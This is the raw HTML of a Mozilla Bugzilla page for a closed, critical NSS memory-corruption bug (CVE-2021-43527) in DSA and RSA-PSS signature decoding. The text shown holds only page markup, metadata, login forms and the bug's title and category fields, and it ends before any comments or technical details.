<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1737470 - (CVE-2021-43527) Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1737470">
<meta property="og:description"
      content="RESOLVED (djackson) in NSS - Libraries. Last updated 2022-08-26.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="--">

    

    <meta name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20241211.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;,&quot;use_markdown&quot;:&quot;1&quot;},&quot;string&quot;:{&quot;TextEditor&quot;:{&quot;command_bold&quot;:&quot;Bold&quot;,&quot;command_bulleted_list&quot;:&quot;Bulleted list&quot;,&quot;command_code&quot;:&quot;Code&quot;,&quot;command_heading&quot;:&quot;Heading&quot;,&quot;command_italic&quot;:&quot;Italic&quot;,&quot;command_link&quot;:&quot;Link&quot;,&quot;command_numbered_list&quot;:&quot;Numbered list&quot;,&quot;command_quote&quot;:&quot;Quote&quot;,&quot;comment_editor&quot;:&quot;Comment Editor&quot;,&quot;edit&quot;:&quot;Edit&quot;,&quot;etiquette_link&quot;:{&quot;href&quot;:&quot;page.cgi?id=etiquette.html&quot;,&quot;text&quot;:&quot;Etiquette&quot;},&quot;guidelines_link&quot;:{&quot;href&quot;:&quot;page.cgi?id=bug-writing.html&quot;,&quot;text&quot;:&quot;Bug Writing Guidelines&quot;},&quot;loading&quot;:&quot;Loadingâ€¦&quot;,&quot;markdown_link&quot;:{&quot;href&quot;:&quot;https:\/\/guides.github.com\/features\/mastering-markdown\/&quot;,&quot;text&quot;:&quot;Markdown supported&quot;},&quot;preview&quot;:&quot;Preview&quot;,&quot;preview_error&quot;:&quot;Preview could not be loaded. Please try again later.&quot;,&quot;text_editor&quot;:&quot;Text Editor&quot;,&quot;toolbar_label&quot;:&quot;Markdown text-formatting toolbar&quot;},&quot;bug&quot;:&quot;bug&quot;,&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:true,&quot;login&quot;:&quot;&quot;}}">
    <meta name="google-site-verification" content="JYXIuR9cAlV7fLmglSrc_4UaJS6Wzh5Mdxiorqu5AQc" />
    <title>1737470 - (CVE-2021-43527) Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1737470&amp;hide_resolved=1">
    <link rel="Show" title="Dependency Graph"
          href="/showdependencygraph.cgi?id=1737470">
    <link rel="Show" title="Bug Activity"
          href="/show_activity.cgi?id=1737470">

<link href="/static/v20241211.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/extensions/EditComments/web/styles/inline-comment-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/extensions/Review/web/styles/review.css" rel="stylesheet" type="text/css"><link href="/static/v20241211.1/skins/standard/text-editor.css" rel="stylesheet" type="text/css">



    
<script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/jquery/jquery-min.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/global.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/util.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/widgets.js"></script>

      <script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ">BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"comments\":{\"cf_tracking_firefox135\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox136\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox134\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_relnote\":{\"?\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox_esr91\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox94\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox96\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr115\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr128\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox95\":{\"?\":\"[Tracking Requested - why for this release]:\"}},\"flags\":{\"project\":{\"cf_accessibility_severity\":\"---\"},\"tracking\":{\"cf_tracking_firefox_relnote\":\"---\",\"cf_status_firefox96\":\"fixed\",\"cf_status_firefox_esr91\":\"fixed\",\"cf_tracking_firefox136\":\"---\",\"cf_tracking_firefox135\":\"---\",\"cf_status_firefox135\":\"---\",\"cf_status_firefox_esr115\":\"---\",\"cf_tracking_firefox_esr128\":\"---\",\"cf_tracking_firefox_esr91\":\"96+\",\"cf_status_firefox134\":\"---\",\"cf_status_firefox_esr78\":\"wontfix\",\"cf_tracking_firefox134\":\"---\",\"cf_status_firefox93\":\"wontfix\",\"cf_status_firefox136\":\"---\",\"cf_status_firefox94\":\"wontfix\",\"cf_tracking_firefox95\":\"+\",\"cf_status_firefox_esr128\":\"---\",\"cf_tracking_firefox_esr115\":\"---\",\"cf_tracking_firefox96\":\"+\",\"cf_status_firefox95\":\"wontfix\",\"cf_tracking_firefox94\":\"-\"}},\"types\":[\"tracking\"]}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  
    BUGZILLA.bug_id = 1737470;
    BUGZILLA.bug_title = '1737470 - (CVE-2021-43527) Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)';
    BUGZILLA.bug_summary = 'Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)';
    BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1737470';
    BUGZILLA.bug_keywords = 'csectype-bounds, sec-critical',
    BUGZILLA.bug_secure = false;
    

  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    can_triage: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };
  review_suggestions = {
    _mentors: [
    ],

      _product: [{ login: 'rrelyea\x40redhat.com', identity: 'Robert Relyea \x3crrelyea\x40redhat.com\x3e', review_count: 25 },{ login: 'kaie\x40kuix.de', identity: 'Kai Engert [:KaiE:] \x3ckaie\x40kuix.de\x3e', review_count: 6 }
      ],

      
      'Libraries': [
      ],

    
    _end: 1
  };

    static_component = 'Libraries';
      </script>
<script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/text-editor.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/BugModal/web/attachments_overlay.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/BugModal/web/comments.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/bugzilla-readable-status-min.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/field.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/comments.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/lib/prism.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/js/lib/md5.min.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/Review/web/js/badge.js"></script><script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/Review/web/js/review.js"></script>

    

    
    <link href="/static/v20241211.1/skins/lib/fontawesome.min.css" rel="stylesheet" type="text/css">
    <link href="/static/v20241211.1/skins/lib/fontawesome-brands.min.css" rel="stylesheet" type="text/css">
    <link href="/static/v20241211.1/skins/lib/fontawesome-solid.min.css" rel="stylesheet" type="text/css">

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1737470">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1737470"><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal">



<div id="wrapper">

<header id="header" role="banner" aria-label="Global Header">
  <div class="inner" role="none">
    <button type="button" class="iconic ghost" id="open-menu-drawer" aria-label="Open Site Menu">
      <span class="icon" aria-hidden="true" data-icon="menu"></span>
    </button><div id="header-external-links" class="dropdown" role="none">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor"
          aria-label="Show Mozilla Menu" aria-expanded="false" aria-haspopup="true"
          aria-controls="header-external-menu">
    <img src="/static/v20241211.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg"
         width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" aria-label="Mozilla Menu"
      style="display:none;">
    <li role="none">
      <a href="https://www.mozilla.org/" role="menuitem">
        <span class="label" role="none">Mozilla Home</span>
      </a>
    </li>
    <li role="separator"></li>
    <li role="none">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem">
        <span class="label" role="none">Privacy</span>
      </a>
    </li>
    <li role="none">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem">
        <span class="label" role="none">Cookies</span>
      </a>
    </li>
    <li role="none">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem">
        <span class="label" role="none">Legal</span>
      </a>
    </li>
  </ul>
</div>
    <h1 id="header-title" class="title" role="none">
      <a class="header-button" href="https://bugzilla.mozilla.org/home" title="Go to home page">
        <span aria-label="Go to Bugzilla Home Page">Bugzilla</span>
      </a>
    </h1>
    <form id="header-search" class="quicksearch" action="/buglist.cgi"
          data-no-csrf role="search" aria-label="Search Bugs">
      <button type="button" class="iconic ghost" id="show-searchbox"
              aria-label="Search Bugs">
        <span class="icon" aria-hidden="true" data-icon="search"></span>
      </button>
      <div class="searchbox-outer dropdown" role="combobox" aria-label="Quick Search"
           aria-haspopup="listbox" aria-owns="header-search-dropdown" aria-expanded="false">
        <span class="icon" aria-hidden="true" data-icon="search"></span>
        <input id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" accesskey="s"
               placeholder="Search Bugs"
               title="Enter a bug number or some search terms"
               role="searchbox" aria-controls="header-search-dropdown" aria-label="Search Terms"><div id="header-search-dropdown" class="dropdown-content dropdown-panel right" role="listbox"
     style="display: none;">
  <div id="header-search-dropdown-wrapper" role="none">
    <section id="header-search-dropdown-help" role="group" aria-label="Help">
      <footer role="none">
        <a href="/page.cgi?id=quicksearch.html">Quick Search Tips</a>
        <a href="/query.cgi?format=advanced">Advanced Search</a>
      </footer>
    </section>
  </div>
</div>
      </div>
    </form>
    <nav id="header-nav" role="menubar" aria-label="Site Links">
      <ul class="links" role="none"><li role="none">
    <a class="header-button" href="/describecomponents.cgi"
       title="Browse bugs by component" role="menuitem">
      <span class="icon" aria-hidden="true" data-icon="category"></span>
      <span class="label" role="none">Browse</span>
    </a>
  </li>
  <li role="none">
    <a class="header-button" href="/query.cgi?format=advanced"
       title="Search bugs using various criteria" role="menuitem">
      <span class="icon" aria-hidden="true" data-icon="pageview"></span>
      <span class="label" role="none">Advanced Search</span>
    </a>
  </li>
  <li role="none">
    <a class="header-button" href="/enter_bug.cgi"
       title="File a new bug" role="menuitem">
      <span class="icon" aria-hidden="true" data-icon="add_box"></span>
      <span class="label" role="none">New Bug</span>
    </a>
  </li>
      </ul>
      <div class="dropdown" role="none">
        <button type="button" id="header-tools-menu-button"
                class="header-button dropdown-button minor" title="More toolsâ€¦"
                role="menuitem" aria-label="Show More Tools Menu" aria-expanded="false"
                aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true" data-icon="more_horiz"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu"
            aria-label="More Tools Menu" style="display:none;"><li role="none">
    <a href="/report.cgi" role="menuitem">
      <span class="icon" aria-hidden="true" data-icon="analytics"></span>
      <span class="label" role="none">Reports</span>
    </a>
  </li>
    <li role="separator"></li>
    <li role="none">
      <a href="https://bmo.readthedocs.io/en/latest/" target="_blank" role="menuitem">
        <span class="icon" aria-hidden="true" data-icon="help"></span>
        <span class="label" role="none">Documentation</span>
      </a>
    </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links" role="none"><li id="mini_login_container_top" role="none">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form header-button' data-qs-suffix="_top"
     role="button">
    <span class="icon" aria-hidden="true" data-icon="login"></span>
    <span class="label" role="none">Log In</span>
  </a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden">

<form method="post" action="/github.cgi">
    <input type="hidden" name="github_token" value="haJPqdOwAXSn7HXLXGSCjBszwkzlIDQltt4ojvN7iGOKJmoRDMJv3bTvmO7OHfMWTbyWOvBP6F3Qz89ZwmJyoEpWohK1lZ7hR6ZweydLRbBvymm9sfAqCyC3BqEijtbzGQFb5yekFUDPTRMH8gi4m2YHu2jRZrfmQhCpCd5qe7NoWA78jXQbtTfk7Z3tB3oHi0qdE57CxqGV1lyWwgJyqbaUMssCSROTWQJqYdsD20l4H5IwF7rRmo9KW1fX9Vn4">
    <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
    <button type="submit">
      <i class="fab fa-github"></i> Log In with GitHub
    </button>
  </form>

    <div class="method-separator">or</div>

  <form action="/show_bug.cgi?id=1737470" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <span class="remember-outer">
        <input type="checkbox" id="Bugzilla_remember_top"
               name="Bugzilla_remember" value="on" class="bz_remember"
               checked>
        <label for="Bugzilla_remember_top">Remember me</label>
      </span>
    <input type="hidden" name="Bugzilla_login_token"
           value="1736345892-lkL5fj-1qsDrer85-Wi6jsd9_3atgqS1Mt-JNCZCHu8">
    <input type="submit" name="GoAheadAndLogIn" value="Log In" id="log_in_top"
           class="check_mini_login_fields" data-qs-suffix="_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  <div class="footer">
      <a href="/createaccount.cgi">Create an Account</a>
    &middot;
    <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
       class='show_forgot_form'
       data-qs-suffix="_top">Forgot Password</a>
  </div>
  </div>

  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1736345892-2WGM3l_hE_n16bMKO5A74HADzhn23AZDWnNa8d7wEM0">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul>
  </div>
  <dialog id="menu-drawer" inert aria-label="Site Menu">
    <div class="drawer-inner" role="none">
      <div class="header" role="none">
        <button type="button" class="iconic ghost" id="close-menu-drawer"
                aria-label="Close Site Menu">
          <span class="icon" aria-hidden="true" data-icon="close"></span>
        </button>
      </div>
      <ul role="menu" aria-label="Site Links"><li role="none">
    <a class="header-button" href="/describecomponents.cgi"
       title="Browse bugs by component" role="menuitem">
      <span class="icon" aria-hidden="true" data-icon="category"></span>
      <span class="label" role="none">Browse</span>
    </a>
  </li>
  <li role="none">
    <a class="header-button" href="/query.cgi?format=advanced"
       title="Search bugs using various criteria" role="menuitem">
      <span class="icon" aria-hidden="true" data-icon="pageview"></span>
      <span class="label" role="none">Advanced Search</span>
    </a>
  </li>
  <li role="none">
    <a class="header-button" href="/enter_bug.cgi"
       title="File a new bug" role="menuitem">
      <span class="icon" aria-hidden="true" data-icon="add_box"></span>
      <span class="label" role="none">New Bug</span>
    </a>
  </li><li role="none">
    <a href="/report.cgi" role="menuitem">
      <span class="icon" aria-hidden="true" data-icon="analytics"></span>
      <span class="label" role="none">Reports</span>
    </a>
  </li>
    <li role="separator"></li>
    <li role="none">
      <a href="https://bmo.readthedocs.io/en/latest/" target="_blank" role="menuitem">
        <span class="icon" aria-hidden="true" data-icon="help"></span>
        <span class="label" role="none">Documentation</span>
      </a>
    </li>
      </ul>
    </div>
  </dialog>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary separate-dropdown-button-main"
      title="Copy bug number and summary to your clipboard">Copy Summary</button
    ><div id="copy-menu-dropdown" class="dropdown"><button type="button" id="copy-menu-btn" aria-haspopup="true" aria-label="View"
      aria-expanded="false" aria-controls="copy-menu" class="dropdown-button secondary separate-dropdown-button-arrow"
      title="More options for copy">&#9662;</button>
      <ul class="dropdown-content left" id="copy-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="copy-markdown-summary" role="menuitem" tabindex="-1">Markdown</a>
        </li>
        <li role="presentation">
          <a id="copy-markdown-bug-number" role="menuitem" tabindex="-1">Markdown (bug number)</a>
        </li>
        <li role="presentation">
          <a id="copy-text-summary" role="menuitem" tabindex="-1">Plain Text</a>
        </li>
        <li role="presentation">
          <a id="copy-html-summary" role="menuitem" tabindex="-1">HTML</a>
        </li>
      </ul>
    </div>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1737470" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1737470" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field bug_modal indent"
    id="field-status_summary"
>



  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1737470">Bug 1737470</a>
          <span class="edit-hide">(CVE-2021-43527)</span>
      </span>
      <span class="bug-time-labels">
        <span class="bug-time-label">Opened <span class="rel-time" title="2021-10-24 07:59 PDT" data-time="1635087557">3 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2021-12-01 10:14 PST" data-time="1638382498">3 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field bug_modal indent edit-hide"
>



  
    <div class=" container">
      

      <h1 id="field-value-short_desc">Memory Corruption in decode<wbr>ECor<wbr>Dsa<wbr>Signature with DSA signatures (and RSA-PSS)</h1>
    </div>

  
</div>

    <div class="field bug_modal edit-show"
    id="field-short_desc" style="display:none"
>
    <div class="name">
      
        <span class="required_star edit-show" style="display:none" aria-label="Required Field">*</span> 
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-short_desc">
            Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (NSS :: Libraries, defect)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field bug_modal"
    id="field-product"
>
    <div class="name">
      
        <a href="/describecomponents.cgi?product=NSS" id="product-help-link" class="help">Product:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">NSS
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">NSS</div>
            <div class="description">Network Security Services - a cross-platform
security library (<a href="http://www.mozilla.org/projects/security/pki/nss/">more info</a>)</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=NSS&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=NSS"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="NSS"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field bug_modal"
    id="field-component"
>
    <div class="name">
      
        <a href="/describecomponents.cgi?product=NSS&component=Libraries#Libraries" id="component-help-link" class="help">Component:
        </a>
    </div>



  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">Libraries
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">NSS :: Libraries</div>
            <div class="description">Libraries for client support of SSL v2 and v3, TLS, PKCS #5,
PKCS #7, PKCS #11, PKCS #12, S/MIME, X.509 v3 certificates,
and other security standards</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=NSS&amp;component=Libraries&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=NSS&amp;component=Libraries&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=NSS&amp;component=Libraries"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="NSS" data-component="Libraries"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field bug_modal edit-show"
    id="field-version" style="display:none"
>
    <div class="name">
      
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>



  
